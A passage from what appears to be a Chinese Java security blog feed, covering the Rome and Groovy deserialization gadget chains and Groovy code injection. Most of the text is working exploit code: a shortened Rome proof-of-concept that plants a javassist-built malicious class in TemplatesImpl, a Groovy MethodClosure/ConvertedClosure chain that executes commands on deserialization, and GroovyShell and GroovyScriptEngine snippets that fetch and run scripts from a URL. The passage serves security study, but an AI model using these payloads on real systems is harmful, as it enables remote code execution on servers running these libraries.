class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC缩短"><a href="#POC缩短" class="headerlink" title="POC缩短"></a>POC缩短</h2><p>在上文的构造的POC中，调用链为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap/HashTable.readObject()</span><br><span class="line">    ObjectBean.hashCode()</span><br><span class="line">            EqualsBean.beanHashCode()</span><br><span class="line">                ObjectBean.toString()</span><br><span class="line">                    ToStringBean.toString()</span><br><span class="line">                        TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p>在URLDNS链中，是利用HashMap反序列化时会调用equals方法或hashCode方法来实现的。注意到EqualsBean#beanEquals方法中也能实现ToStringBean#toString方法去调用TemplatesImpl#getOutputProperties方法，并且EqualsBean#beanEquals方法可以通过EqualsBean#equals方法来直接调用，那么能不能尝试利用HashMap反序列化时调用EqualsBean#equals方法来达成恶意利用呢？</p><p><img src="/2023/10/06/Rome/1709281734861-7a508a5d-ca9d-4396-b626-d962362cc1a3.png"></p><p>答案显然是可以的，HashMap#putVal方法在解决哈希冲突问题时，会调用AbstractMap#equals方法，这里value如果为TemplatesImpl对象，即可实现调用。</p><p><img src="/2023/10/06/Rome/1709282238614-2a84c2f9-d0c8-4054-990e-025710422d59.png"></p><p>那么还有没有哪里可以进一步缩短呢？答案是从TemplatesImpl入手，直接利用javassist去生成一个极简的恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeShort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, templates);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, equalsBean);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, equalsBean);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, templates);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setFieldValue(equalsBean,<span class="string">&quot;_obj&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/06/Rome/1709283235027-787325cb-3358-47ec-b30a-892e3181241d.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Groovy</title>
      <link href="/2023/10/01/Groovy/"/>
      <url>/2023/10/01/Groovy/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Groovy是一种基于JVM的开发语言，具有类似于Python，Ruby，Perl和Smalltalk的功能。Groovy既可以用作Java平台的编程语言，也可以用作脚本语言。Groovy编译之后生成.class文件，与Java编译生成的无异，因此可以在JVM上运行。</p><p>在项目中可以引用Groovy的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用groovy-all。</p><p>依赖版本为groovy 1.7.0-2.4.3。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><p>org.codehaus.groovy.runtime.MethodClosure是方法闭包，使用闭包代表了一个对象的一个方法。MethodClosure#MethodClosure方法初始化时接收两个参数，一个是对象，一个是对象的方法名称。并且MethodClosure#doCall方法调用InvokerHelper#invokeMethod方法进行方法调用。利用这个特性，可以使用MethodClosure来执行系统命令。</p><p><img src="/2023/10/01/Groovy/1710254460793-f22b1927-42e9-40bb-9db2-aa202a14e28b.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">method.invoke(methodClosure, <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="String-execute"><a href="#String-execute" class="headerlink" title="String.execute"></a>String.execute</h3><p>Groovy为String类型添加了execute方法，这个方法会返回一个Process对象。在Groovy中，可以直接使用”ls”.execute()这种方法来执行系统命令ls，本质上还是调用Runtime.getRuntime().exec(self)方法执行系统命令。</p><p><img src="/2023/10/01/Groovy/1710255432981-f30b587f-f4b2-4763-a426-0e1a6e830e86.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodClosure</span> <span class="variable">execute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">execute.call();</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p>org.codehaus.groovy.runtime.ConvertedClosure是一个通用适配器，用于将闭包适配到Java接口。ConvertedClosure实现了ConversionHandler类，ConversionHandler又实现了InvocationHandler类，因此ConvertedClosure本身就是一个动态代理类。</p><p>ConvertedClosure的构造方法接收一个Closure对象和一个String类型的method方法名，也就是说ConvertedClosure会代理这个Closure对象，当调用其method方法时，将会调用ConvertedClosure父类的invoke方法，除了toString和一些默认方法外，会调用invokeCustom方法。</p><p>如果初始化时指定的method与invokeCustom指定的method参数相同，则invokeCustom方法将会调用代理对象Closure的call方法执行传入参数执行。</p><p><img src="/2023/10/01/Groovy/1710256133490-fba55b71-7d9c-456c-8b3a-94699d8ed0fb.png"></p><p><img src="/2023/10/01/Groovy/1710256155981-30f5e1b7-0849-4ce2-8f4a-ca66c4dbdeb6.png"></p><p><img src="/2023/10/01/Groovy/1710256246007-9a34471e-7576-4c4e-8802-7567b67ae084.png"></p><h2 id="利用构造"><a href="#利用构造" class="headerlink" title="利用构造"></a>利用构造</h2><p>利用AnnotationInvocationHandler将ConvertedClosure代理成Map类进行反序列化。AnnotationInvocationHandler反序列化时调用memberValues中存放对象的entrySet对象，这个对象是ConvertedClosure，而这个对象又实际上是MethodClosure对象的代理，定义了在调用entrySet方法时会调用invoke方法去调用MethodClosure#call方法，触发Groovy中String类型的execute方法，执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.*;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.groovy.GroovyScriptEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, convertedClosure);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(invocationHandler);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，并且程序并未对输入的Groovy代码进行有效的过滤，那么可能会导致恶意的Groovy代码注入，从而实现RCE操作。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">void</span> main(args) &#123;</span><br><span class="line">        <span class="comment">//        def command1 = &quot;whoami&quot;;</span></span><br><span class="line">        <span class="comment">//        println command1.execute();</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command1.execute()&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//        println command1.execute().text;</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command1.execute().text&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> command2 = <span class="string">&#x27;open -a Calculator&#x27;</span>;</span><br><span class="line">        println command2.execute();</span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command2.execute()&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//        println command2.execute().text;</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command2.execute().text&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CroovyShell"><a href="#CroovyShell" class="headerlink" title="CroovyShell"></a>CroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 直接执行Groovy代码</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell.evaluate(<span class="string">&quot;\&quot;open -a Calculator\&quot;.execute()&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载本地Groovy脚本</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        <span class="type">Script</span> <span class="variable">script</span> <span class="operator">=</span> groovyShell1.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line">        script.run();</span><br><span class="line">        groovyShell1.evaluate(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载远程Groovy脚本</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell2.evaluate(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://127.0.0.1:8080/exec.groovy&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。GroovyScriptEngine构造方法存在重载的方式，可以指定远程URL&#x2F;根文件位置&#x2F;ClassLoader，之后通过使用run方法回显，有两个重载，一个是传入脚本名和对应的参数，另一个是脚本名和Binding对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 通过传入根路径之后调用对应的脚本</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">groovyScriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;src/main/java/org/example/deserialize/groovy&quot;</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">&quot;exec.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过调用远程url之后调用特定脚本</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">groovyScriptEngine1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        groovyScriptEngine1.run(<span class="string">&quot;exec.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过Binding加载</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">groovyScriptEngine2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        groovyScriptEngine2.run(<span class="string">&quot;src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Binding</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="GroovyScriptEvaluator"><a href="#GroovyScriptEvaluator" class="headerlink" title="GroovyScriptEvaluator"></a>GroovyScriptEvaluator</h4><p>GroovyScriptEvaluator#evaluate方法同样可以执行Groovy代码，本质还是GroovyShell，但是evaluate参数需要是org.springframework.scripting.ScriptSource接口的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.groovy.GroovyScriptEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UrlResource</span> <span class="variable">urlResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span 